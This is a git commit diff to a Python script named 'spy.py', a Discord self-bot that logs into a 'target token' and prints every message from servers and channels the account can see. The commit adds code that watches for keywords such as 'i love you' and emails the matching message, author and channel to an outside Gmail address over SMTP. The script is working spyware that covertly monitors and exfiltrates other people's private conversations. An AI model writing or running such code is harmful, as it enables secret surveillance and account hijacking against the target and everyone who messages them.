7ecc6de78a62b41f5a985ec205937a2ca6e6b927
Null <66488397+NullByte75@users.noreply.github.com>
2020-08-05 10:23:38 +0200

    Update spy.py

--- spy.py
+++ spy.py
@@ -1,7 +1,8 @@
 import discord
+import smtplib, ssl
 from discord.ext import commands
 import asyncio
-token = "somerandomtokenblablabla" #insert target token
+token = "token" #insert target token
 prefix = ""
 client = discord.Client()
 message = discord.Message 
@@ -9,6 +10,22 @@ bot = commands.Bot(command_prefix=prefix, self_bot=True)
 @bot.event
 async def on_message(message):
     print("on:" + " " + message.guild.name + " " + " in ch:" + " " +  message.channel.name + " " + "from:" + " " + message.author.name + ":" + " " + message.content)
+    list = ['i love you', 'if a message contains one of these a email with the content will be sent']
+    for x in list:
+        if str(x) in message.content:
+            port = 587
+            smtp_server = "smtp.gmail.com"
+            sender_email = "from@gmail.com"
+            receiver_email = "to@gmail.com"
+            password = "frompassword"
+            messaggio = "on:" + " " + message.guild.name + " " + " in ch:" + " " +  message.channel.name + " " + "from:" + " " + message.author.name + ":" + " " + message.content
+            context = ssl.create_default_context()
+            with smtplib.SMTP(smtp_server, port) as server:
+                server.ehlo()
+                server.starttls(context=context)
+                server.ehlo()  
+                server.login(sender_email, password)
+                server.sendmail(sender_email, receiver_email, messaggio)
 asyncio.set_event_loop(asyncio.new_event_loop())
 loop = asyncio.new_event_loop()
 bot.run(token, bot=False)
